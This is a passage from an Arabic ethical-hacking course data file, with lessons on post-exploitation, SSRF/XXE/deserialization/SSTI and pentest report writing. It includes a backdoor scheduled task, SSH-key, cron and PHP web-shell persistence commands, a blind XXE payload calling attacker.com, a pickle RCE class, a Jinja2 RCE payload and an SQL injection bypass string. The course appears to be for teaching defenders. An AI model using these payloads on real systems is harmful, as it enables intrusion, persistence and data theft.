schtasks /create /tn "Update" /tr "C:\\backdoor.exe" /sc onlogon
\`\`\`

## 2. استطلاع داخلي

### معلومات النظام
\`\`\`bash
# Linux
whoami && id
uname -a
cat /etc/passwd
ps aux

# Windows
whoami /all
systeminfo
net user
\`\`\`

### الشبكة
\`\`\`bash
# Linux
ifconfig / ip a
netstat -tulpn
cat /etc/hosts

# Windows
ipconfig /all
netstat -ano
arp -a
\`\`\`

## 3. التحرك الجانبي

### Pass the Hash (Windows)
استخدام hash بدون كسره

### SSH Keys
استخدام مفاتيح مكتشفة

### Network Shares
\`\`\`bash
# Windows
net view
net use \\\\server\\share
\`\`\`

## 4. جمع البيانات

### الملفات المهمة
- Configuration files
- Database backups
- Credentials
- Documents

### Exfiltration
- HTTP/HTTPS
- DNS tunneling
- Cloud storage
`,
    codeExample: `# محاكاة Post-Exploitation
import os
import json
from datetime import datetime

class PostExploitationDemo:
    """
    محاكاة مراحل Post-Exploitation للتعليم
    ⚠️ للأغراض التعليمية فقط!
    """
    
    def __init__(self):
        self.access_level = "user"
        self.discovered_data = []
        self.lateral_targets = []
    
    def enumerate_system(self):
        """استطلاع النظام"""
        print("\\n🔍 System Enumeration")
        print("=" * 50)
        
        # محاكاة معلومات النظام
        system_info = {
            "hostname": "CORP-WEB-01",
            "os": "Ubuntu 20.04 LTS",
            "kernel": "5.4.0-generic",
            "current_user": "www-data",
            "groups": ["www-data", "adm"],
            "ip_addresses": ["192.168.1.100", "10.0.0.50"],
        }
        
        print(f"\\n  📌 Hostname: {system_info['hostname']}")
        print(f"  💻 OS: {system_info['os']}")
        print(f"  🐧 Kernel: {system_info['kernel']}")
        print(f"  👤 User: {system_info['current_user']}")
        print(f"  👥 Groups: {', '.join(system_info['groups'])}")
        print(f"  🌐 IPs: {', '.join(system_info['ip_addresses'])}")
        
        return system_info
    
    def enumerate_network(self):
        """استطلاع الشبكة"""
        print("\\n🌐 Network Enumeration")
        print("=" * 50)
        
        # محاكاة اكتشاف الشبكة
        network_data = {
            "internal_hosts": [
                {"ip": "192.168.1.1", "hostname": "router", "ports": [22, 80]},
                {"ip": "192.168.1.10", "hostname": "DC01", "ports": [53, 88, 389, 445]},
                {"ip": "192.168.1.20", "hostname": "FILE-SRV", "ports": [445, 139]},
                {"ip": "192.168.1.30", "hostname": "DB-SRV", "ports": [3306, 22]},
            ],
            "routes": ["192.168.1.0/24", "10.0.0.0/24"],
        }
        
        print("\\n  🖥️ Discovered Hosts:")
        for host in network_data["internal_hosts"]:
            ports_str = ", ".join(map(str, host["ports"]))
            print(f"    {host['ip']:<15} {host['hostname']:<15} [{ports_str}]")
            self.lateral_targets.append(host)
        
        print(f"\\n  🛤️ Routes: {', '.join(network_data['routes'])}")
        
        # تحديد أهداف محتملة
        print("\\n  🎯 High-Value Targets:")
        for host in network_data["internal_hosts"]:
            if 88 in host["ports"]:
                print(f"    ⭐ {host['hostname']} - Domain Controller!")
            if 3306 in host["ports"]:
                print(f"    ⭐ {host['hostname']} - Database Server!")
            if 445 in host["ports"]:
                print(f"    📁 {host['hostname']} - File Shares")
        
        return network_data
    
    def find_credentials(self):
        """البحث عن بيانات الاعتماد"""
        print("\\n🔑 Credential Hunting")
        print("=" * 50)
        
        found_creds = []
        
        # محاكاة الأماكن الشائعة
        locations = [
            ("/var/www/html/config.php", "db_password = 'P@ssw0rd123'"),
            ("~/.bash_history", "mysql -u root -pSecretPass"),
            ("/home/admin/.ssh/id_rsa", "[PRIVATE KEY FOUND]"),
            ("~/.git-credentials", "https://user:token@github.com"),
            ("/etc/shadow", "admin:$6$rounds=...:[HASH]"),
        ]
        
        print("\\n  📂 Checking common locations...")
        for path, finding in locations:
            print(f"\\n    📄 {path}")
            print(f"       ✅ Found: {finding[:40]}...")
            found_creds.append({"location": path, "data": finding})
        
        self.discovered_data.extend(found_creds)
        
        # Environment variables
        print("\\n  🔧 Environment Variables:")
        env_creds = [
            ("DB_PASSWORD", "Production123!"),
            ("API_KEY", "sk_live_abc123..."),
            ("AWS_SECRET_KEY", "wJalrXUtnFEMI..."),
        ]
        
        for var, value in env_creds:
            print(f"    {var}={value[:15]}...")
            found_creds.append({"location": f"ENV:{var}", "data": value})
        
        return found_creds
    
    def establish_persistence(self):
        """إنشاء Persistence"""
        print("\\n🔒 Establishing Persistence")
        print("=" * 50)
        
        methods = [
            {
                "name": "SSH Key",
                "command": "echo 'attacker_key' >> ~/.ssh/authorized_keys",
                "stealth": "High",
                "reliability": "High"
            },
            {
                "name": "Cron Job",
                "command": "echo '*/5 * * * * /tmp/.backdoor' >> /etc/crontab",
                "stealth": "Medium",
                "reliability": "High"
            },
            {
                "name": "Web Shell",
                "command": "echo '<?php system($_GET[\\"c\\"]); ?>' > /var/www/.hidden.php",
                "stealth": "Low",
                "reliability": "Medium"
            },
            {
                "name": "Systemd Service",
                "command": "Create /etc/systemd/system/updater.service",
                "stealth": "Medium",
                "reliability": "High"
            },
        ]
        
        print("\\n  📌 Persistence Methods:")
        for m in methods:
            print(f"\\n    🔧 {m['name']}")
            print(f"       Command: {m['command'][:50]}...")
            print(f"       Stealth: {m['stealth']} | Reliability: {m['reliability']}")
        
        return methods
    
    def lateral_movement(self):
        """التحرك الجانبي"""
        print("\\n➡️ Lateral Movement")
        print("=" * 50)
        
        if not self.lateral_targets:
            print("  ❌ No targets discovered")
            return
        
        print("\\n  🎯 Attempting lateral movement...")
        
        # محاكاة محاولات
        attempts = [
            {
                "target": "DB-SRV (192.168.1.30)",
                "method": "SSH with discovered key",
                "result": "✅ SUCCESS"
            },
            {
                "target": "FILE-SRV (192.168.1.20)",
                "method": "SMB with Pass-the-Hash",
                "result": "✅ SUCCESS"
            },
            {
                "target": "DC01 (192.168.1.10)",
                "method": "Kerberoasting",
                "result": "⏳ Hash captured, cracking..."
            },
        ]
        
        for attempt in attempts:
            print(f"\\n    🖥️ {attempt['target']}")
            print(f"       Method: {attempt['method']}")
            print(f"       Result: {attempt['result']}")
    
    def generate_report(self):
        """توليد تقرير"""
        print("\\n" + "=" * 60)
        print("  📋 Post-Exploitation Summary Report")
        print("=" * 60)
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "access_achieved": self.access_level,
            "credentials_found": len(self.discovered_data),
            "lateral_targets": len(self.lateral_targets),
            "recommendations": [
                "Change all discovered passwords immediately",
                "Remove unauthorized SSH keys",
                "Audit cron jobs and startup scripts",
                "Implement network segmentation",
                "Enable MFA for critical systems",
                "Deploy EDR/SIEM solutions",
            ]
        }
        
        print(f"\\n  📅 Time: {report['timestamp']}")
        print(f"  🔓 Access Level: {report['access_achieved']}")
        print(f"  🔑 Credentials Found: {report['credentials_found']}")
        print(f"  🖥️ Potential Targets: {report['lateral_targets']}")
        
        print("\\n  🛡️ Remediation Recommendations:")
        for i, rec in enumerate(report['recommendations'], 1):
            print(f"    {i}. {rec}")
        
        return report


# تشغيل المحاكاة
demo = PostExploitationDemo()

# تنفيذ المراحل
demo.enumerate_system()
demo.enumerate_network()
demo.find_credentials()
demo.establish_persistence()
demo.lateral_movement()
demo.generate_report()`,
    language: 'python',
    xpReward: 200,
    order: 12,
    quiz: {
      question: 'ما هو Lateral Movement؟',
      options: [
        'الخروج من النظام',
        'الانتقال لأنظمة أخرى في الشبكة',
        'حذف الآثار',
        'تحديث البرامج',
      ],
      correctAnswer: 1,
      explanation:
        'Lateral Movement هو استخدام الوصول الحالي للانتقال لأنظمة أخرى في نفس الشبكة',
    },
  },
  {
    id: 'ethical-web-advanced',
    courseId: 'cyber-ethical-hacking',
    title: 'ثغرات الويب المتقدمة',
    description: 'SSRF, XXE, Deserialization',
    content: `
# ثغرات الويب المتقدمة

## 1. SSRF - Server-Side Request Forgery

### ما هو؟
إجبار الخادم على إرسال طلبات لعناوين غير مصرح بها.

### الخطورة
- الوصول للشبكة الداخلية
- قراءة ملفات محلية
- الوصول لـ Cloud metadata

### مثال
\`\`\`
# URL عادي
https://example.com/fetch?url=https://api.external.com/data

# استغلال SSRF
https://example.com/fetch?url=http://169.254.169.254/metadata
https://example.com/fetch?url=http://localhost/admin
https://example.com/fetch?url=file:///etc/passwd
\`\`\`

### الحماية
- Whitelist للـ URLs المسموحة
- لا file:// أو localhost
- تحقق من IP بعد DNS resolution

---

## 2. XXE - XML External Entity

### ما هو؟
استغلال معالج XML لقراءة ملفات أو إرسال طلبات.

### مثال
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
\`\`\`

### Blind XXE
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
\`\`\`

### الحماية
- تعطيل External Entities
- استخدام JSON بدل XML
- تحديث مكتبات XML

---

## 3. Insecure Deserialization

### ما هو؟
استغلال عملية تحويل البيانات المُسلسلة لكائنات.

### اللغات المتأثرة
- Java (ObjectInputStream)
- PHP (unserialize)
- Python (pickle)
- .NET (BinaryFormatter)

### مثال Python
\`\`\`python
# خطير!
import pickle
data = pickle.loads(user_input)
\`\`\`

### الحماية
- لا تعالج serialized data من مصادر غير موثوقة
- استخدم JSON
- توقيع البيانات
`,
    codeExample: `# ثغرات الويب المتقدمة - للتعليم
import base64
import json

class AdvancedWebVulnsDemo:
    """
    محاكاة ثغرات الويب المتقدمة للتعليم
    """
    
    # ===== SSRF =====
    
    def ssrf_demo(self):
        """محاكاة SSRF"""
        print("\\n🔴 SSRF - Server-Side Request Forgery")
        print("=" * 60)
        
        # طلب عادي
        print("\\n  📥 Normal Request:")
        print("    GET /fetch?url=https://api.example.com/data")
        print("    → Server fetches external API ✅")
        
        # محاولات SSRF
        print("\\n  ⚠️ SSRF Attempts:")
        
        attacks = [
            {
                "payload": "http://169.254.169.254/latest/meta-data/",
                "target": "AWS Metadata",
                "impact": "Get AWS credentials!"
            },
            {
                "payload": "http://localhost:8080/admin",
                "target": "Internal Admin Panel",
                "impact": "Access admin without auth"
            },
            {
                "payload": "file:///etc/passwd",
                "target": "Local Files",
                "impact": "Read system files"
            },
            {
                "payload": "http://192.168.1.1/",
                "target": "Internal Network",
                "impact": "Scan internal hosts"
            },
        ]
        
        for attack in attacks:
            print(f"\\n    🎯 Payload: {attack['payload']}")
            print(f"       Target: {attack['target']}")
            print(f"       Impact: {attack['impact']}")
        
        # الحماية
        print("\\n  🛡️ Protection:")
        print("    - Whitelist allowed domains")
        print("    - Block private IP ranges")
        print("    - Disable file:// protocol")
        print("    - Validate after DNS resolution")
    
    # ===== XXE =====
    
    def xxe_demo(self):
        """محاكاة XXE"""
        print("\\n🔴 XXE - XML External Entity")
        print("=" * 60)
        
        # XML عادي
        print("\\n  📄 Normal XML:")
        normal_xml = '''<?xml version="1.0"?>
<user>
  <name>Ahmed</name>
  <email>ahmed@example.com</email>
</user>'''
        print(f"    {normal_xml}")
        
        # XXE payload
        print("\\n  ⚠️ XXE Payload:")
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>'''
        print(f"    {xxe_payload}")
        
        print("\\n  💥 Result:")
        print("    Server returns contents of /etc/passwd!")
        
        # Blind XXE
        print("\\n  🕵️ Blind XXE (when no output):")
        blind_xxe = '''<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>'''
        print(f"    {blind_xxe}")
        print("    → Data exfiltrated to attacker's server")
        
        # الحماية
        print("\\n  🛡️ Protection:")
        print("    - Disable DTDs entirely")
        print("    - Disable external entities")
        print("    - Use JSON instead of XML")
    
    # ===== Deserialization =====
    
    def deserialization_demo(self):
        """محاكاة Insecure Deserialization"""
        print("\\n🔴 Insecure Deserialization")
        print("=" * 60)
        
        # شرح المفهوم
        print("\\n  📦 What is Serialization?")
        print("    Object → Bytes → Transfer → Bytes → Object")
        
        # Python pickle
        print("\\n  🐍 Python Pickle Exploit:")
        
        exploit_code = '''
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

# Create malicious pickle
payload = pickle.dumps(Exploit())
# Send to vulnerable server...
'''
        print(f"    {exploit_code}")
        
        # PHP unserialize
        print("\\n  🐘 PHP Unserialize:")
        php_payload = '''
O:4:"User":1:{s:4:"role";s:5:"admin";}
'''
        print(f"    Payload: {php_payload}")
        print("    → Change user role to admin!")
        
        # Java
        print("\\n  ☕ Java Deserialization:")
        print("    - ysoserial tool")
        print("    - Commons Collections gadgets")
        print("    - RCE through ObjectInputStream")
        
        # الحماية
        print("\\n  🛡️ Protection:")
        print("    - Never deserialize untrusted data")
        print("    - Use JSON for data transfer")
        print("    - Sign serialized data (HMAC)")
        print("    - Whitelist allowed classes")
    
    # ===== SSTI =====
    
    def ssti_demo(self):
        """محاكاة SSTI"""
        print("\\n🔴 SSTI - Server-Side Template Injection")
        print("=" * 60)
        
        print("\\n  📝 What is it?")
        print("    Injecting template syntax that gets executed server-side")
        
        # Jinja2
        print("\\n  🐍 Jinja2 (Python/Flask):")
        print("    Input: {{7*7}}")
        print("    Output: 49  ← Template executed!")
        
        print("\\n    RCE Payload:")
        jinja_rce = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        print(f"    {jinja_rce}")
        
        # Twig
        print("\\n  🐘 Twig (PHP):")
        print("    {{_self.env.registerUndefinedFilterCallback('exec')}}")
        print("    {{_self.env.getFilter('id')}}")
        
        # Detection
        print("\\n  🔍 Detection Payloads:")
        payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7 * 7}", "49", "FreeMarker/Velocity"),
            ("<%=7*7%>", "49", "ERB"),
            ("#{7*7}", "49", "Ruby"),
        ]
        
        for payload, result, engine in payloads:
            print(f"    {payload:<15} → {result:<5} ({engine})")
        
        # الحماية
        print("\\n  🛡️ Protection:")
        print("    - Never put user input in templates")
        print("    - Use sandboxed template engines")
        print("    - Escape user input properly")
    
    def run_all_demos(self):
        """تشغيل كل العروض"""
        self.ssrf_demo()
        self.xxe_demo()
        self.deserialization_demo()
        self.ssti_demo()
        
        print("\\n" + "=" * 60)
        print("  📚 Summary: Advanced Web Vulnerabilities")
        print("=" * 60)
        print("""
    | Vulnerability | Impact | Difficulty |
    |---------------|--------|------------|
    | SSRF          | High   | Medium     |
    | XXE           | High   | Medium     |
    | Deserialize   | Critical | High     |
    | SSTI          | Critical | Medium   |
        """)


# تشغيل
demo = AdvancedWebVulnsDemo()
demo.run_all_demos()`,
    language: 'python',
    xpReward: 180,
    order: 13,
    quiz: {
      question: 'ما الذي يمكن لـ SSRF الوصول إليه؟',
      options: [
        'متصفح المستخدم فقط',
        'الشبكة الداخلية للخادم',
        'ملفات المستخدم فقط',
        'لا شيء خطير',
      ],
      correctAnswer: 1,
      explanation:
        'SSRF يجعل الخادم يرسل طلبات، مما يتيح الوصول للشبكة الداخلية والـ metadata services',
    },
  },
  {
    id: 'ethical-report-writing',
    courseId: 'cyber-ethical-hacking',
    title: 'كتابة تقارير اختبار الاختراق',
    description: 'كيف توثق وتقدم نتائجك',
    content: `
# كتابة تقارير اختبار الاختراق

## أهمية التقرير
- التواصل مع الإدارة والفنيين
- توثيق رسمي للنتائج
- أساس لخطة الإصلاح
- إثبات قيمة العمل

## هيكل التقرير

### 1. الملخص التنفيذي (Executive Summary)
للإدارة غير التقنية:
- نظرة عامة
- أهم المخاطر
- التوصيات الرئيسية

### 2. نطاق الاختبار (Scope)
- الأنظمة المستهدفة
- الفترة الزمنية
- القيود والاستثناءات
- المنهجية المتبعة

### 3. الملخص الفني (Technical Summary)
- إحصائيات الثغرات
- التصنيف حسب الخطورة
- رسوم بيانية

### 4. النتائج التفصيلية (Detailed Findings)
لكل ثغرة:
- العنوان والخطورة
- الوصف
- الأثر
- خطوات إعادة الإنتاج
- الأدلة (Screenshots)
- التوصية

### 5. الملاحق
- أدوات مستخدمة
- المراجع
- البيانات الإضافية

## تصنيف الخطورة

| المستوى | CVSS | المعنى |
|---------|------|--------|
| Critical | 9.0-10.0 | خطر فوري، إصلاح عاجل |
| High | 7.0-8.9 | خطر كبير، إصلاح سريع |
| Medium | 4.0-6.9 | خطر معتدل، تخطيط للإصلاح |
| Low | 0.1-3.9 | خطر منخفض، إصلاح عند الإمكان |
| Info | 0 | معلوماتي فقط |

## نصائح الكتابة
- واضح ومباشر
- لا تبالغ ولا تقلل
- أثبت بالدليل
- قدم حلولاً عملية
- راجع قبل التسليم
`,
    codeExample: `# مُولّد تقارير اختبار الاختراق
from datetime import datetime
import json

class PentestReportGenerator:
    """
    مُولّد تقارير اختبار الاختراق
    """
    
    def __init__(self, client_name, tester_name):
        self.client = client_name
        self.tester = tester_name
        self.date = datetime.now().strftime("%Y-%m-%d")
        self.findings = []
        self.scope = {}
    
    def set_scope(self, targets, start_date, end_date, methodology):
        """تحديد النطاق"""
        self.scope = {
            "targets": targets,
            "start_date": start_date,
            "end_date": end_date,
            "methodology": methodology
        }
    
    def add_finding(self, title, severity, cvss, description, 
                    impact, steps, evidence, recommendation):
        """إضافة ثغرة"""
        finding = {
            "id": f"VULN-{len(self.findings)+1:03d}",
            "title": title,
            "severity": severity,
            "cvss": cvss,
            "description": description,
            "impact": impact,
            "steps_to_reproduce": steps,
            "evidence": evidence,
            "recommendation": recommendation
        }
        self.findings.append(finding)
        return finding["id"]
    
    def generate_executive_summary(self):
        """توليد الملخص التنفيذي"""
        severity_count = {
            "Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0
        }
        
        for f in self.findings:
            severity_count[f["severity"]] += 1
        
        summary = f"""
╔══════════════════════════════════════════════════════════════╗
║                    EXECUTIVE SUMMARY                          ║
╚══════════════════════════════════════════════════════════════╝

Client: {self.client}
Assessment Date: {self.scope.get('start_date', 'N/A')} to {self.scope.get('end_date', 'N/A')}
Report Date: {self.date}
Assessor: {self.tester}

OVERVIEW
--------
A penetration test was conducted against {self.client}'s systems
to identify security vulnerabilities and assess the overall
security posture.

VULNERABILITY SUMMARY
---------------------
  🔴 Critical: {severity_count['Critical']}
  🟠 High:     {severity_count['High']}
  🟡 Medium:   {severity_count['Medium']}
  🟢 Low:      {severity_count['Low']}
  ⚪ Info:     {severity_count['Info']}
  ─────────────────
  Total:       {len(self.findings)}

KEY FINDINGS
------------"""
        
        # أهم الثغرات
        critical_high = [f for f in self.findings 
                        if f["severity"] in ["Critical", "High"]]
        
        for i, f in enumerate(critical_high[:3], 1):
            summary += f"""
  {i}. [{f['severity']}] {f['title']}
     Impact: {f['impact'][:50]}..."""
        
        summary += """

RECOMMENDATIONS
---------------
  1. Address Critical and High severity findings immediately
  2. Implement security patches and updates
  3. Conduct security awareness training
  4. Schedule follow-up assessment
"""
        return summary
    
    def generate_finding_detail(self, finding):
        """توليد تفاصيل ثغرة"""
        severity_emoji = {
            "Critical": "🔴", "High": "🟠", 
            "Medium": "🟡", "Low": "🟢", "Info": "⚪"
        }
        
        detail = f"""
┌──────────────────────────────────────────────────────────────┐
│ {finding['id']}: {finding['title']:<45}
├──────────────────────────────────────────────────────────────┤
│ Severity: {severity_emoji[finding['severity']]} {finding['severity']} (CVSS: {finding['cvss']})
└──────────────────────────────────────────────────────────────┘

DESCRIPTION
-----------
{finding['description']}

IMPACT
------
{finding['impact']}

STEPS TO REPRODUCE
------------------"""
        
        for i, step in enumerate(finding['steps_to_reproduce'], 1):
            detail += f"\\n  {i}. {step}"
        
        detail += f"""

EVIDENCE
--------
{finding['evidence']}

RECOMMENDATION
--------------
{finding['recommendation']}
"""
        return detail
    
    def generate_full_report(self):
        """توليد التقرير الكامل"""
        report = []
        
        # صفحة العنوان
        report.append(f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              PENETRATION TEST REPORT                         ║
║                                                              ║
║              Client: {self.client:<30}      ║
║              Date: {self.date:<32}      ║
║                                                              ║
║              CONFIDENTIAL                                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        # الملخص التنفيذي
        report.append(self.generate_executive_summary())
        
        # النطاق
        report.append(f"""
╔══════════════════════════════════════════════════════════════╗
║                         SCOPE                                ║
╚══════════════════════════════════════════════════════════════╝

TARGETS
-------""")
        for target in self.scope.get('targets', []):
            report.append(f"  • {target}")
        
        report.append(f"""

METHODOLOGY: {self.scope.get('methodology', 'OWASP/PTES')}

TESTING PERIOD: {self.scope.get('start_date')} to {self.scope.get('end_date')}
""")
        
        # النتائج التفصيلية
        report.append("""
╔══════════════════════════════════════════════════════════════╗
║                   DETAILED FINDINGS                          ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        # ترتيب حسب الخطورة
        severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        sorted_findings = sorted(self.findings, 
                                key=lambda x: severity_order[x["severity"]])
        
        for finding in sorted_findings:
            report.append(self.generate_finding_detail(finding))
        
        return "\\n".join(report)
    
    def export_json(self):
        """تصدير JSON"""
        return json.dumps({
            "client": self.client,
            "tester": self.tester,
            "date": self.date,
            "scope": self.scope,
            "findings": self.findings
        }, indent=2, ensure_ascii=False)


# ===== مثال على استخدام المُولّد =====
report = PentestReportGenerator(
    client_name="شركة التقنية",
    tester_name="أحمد المختبر"
)

# تحديد النطاق
report.set_scope(
    targets=["https://app.example.com", "192.168.1.0/24"],
    start_date="2024-01-15",
    end_date="2024-01-20",
    methodology="OWASP Testing Guide + PTES"
)

# إضافة الثغرات
report.add_finding(
    title="SQL Injection in Login Form",
    severity="Critical",
    cvss=9.8,
    description="The login form is vulnerable to SQL injection, allowing "
                "authentication bypass and database access.",
    impact="An attacker can bypass authentication, access all user data, "
           "and potentially gain full database access.",
    steps=[
        "Navigate to https://app.example.com/login",
        "Enter ' OR '1'='1 in username field",
        "Enter any value in password field",
        "Click Login - Authentication bypassed"
    ],
    evidence="[Screenshot of successful bypass attached]\\n"
             "Request: POST /login\\nBody: user=' OR '1'='1&pass=x",
    recommendation="Use parameterized queries/prepared statements. "
                   "Implement input validation. Consider using an ORM."
)

report.add_finding(
    title="Missing HTTPS on Admin Panel",
    severity="High",
    cvss=7.4,
    description="The admin panel is accessible over HTTP, exposing "
                "credentials to network sniffing.",
    impact="Admin credentials can be captured by anyone on the network.",
    steps=[
        "Access http://app.example.com/admin",
        "Note that connection is not encrypted",
        "Capture traffic with Wireshark",
        "Credentials visible in plaintext"
    ],
    evidence="[Wireshark capture showing plaintext credentials]",
    recommendation="Enforce HTTPS for all pages. Implement HSTS. "
                   "Redirect all HTTP to HTTPS."
)

# توليد وعرض التقرير
print(report.generate_full_report())`,
    language: 'python',
    xpReward: 140,
    order: 14,
    quiz: {
      question: 'ما أهم قسم في تقرير Pentest للإدارة؟',
      options: [
        'التفاصيل التقنية',
        'الملخص التنفيذي',
        'الأدوات المستخدمة',
        'خطوات إعادة الإنتاج',
      ],
      correctAnswer: 1,
      explanation:
        'الملخص التنفيذي مصمم للإدارة غير التقنية، يوضح المخاطر والتوصيات بلغة بسيطة',
    },
  },
];

// تصدير كل المحتوى الموسّع
export const ALL_EXPANDED_CYBER_LESSONS: Lesson[] = [
  ...EXPANDED_CYBER_LESSONS,
  ...ETHICAL_HACKING_LESSONS,
  ...NETWORK_SECURITY_LESSONS,
  ...ADVANCED_ETHICAL_HACKING,
  ...NETWORK_SECURITY_ADVANCED,
  ...ETHICAL_HACKING_COMPLETE,
];
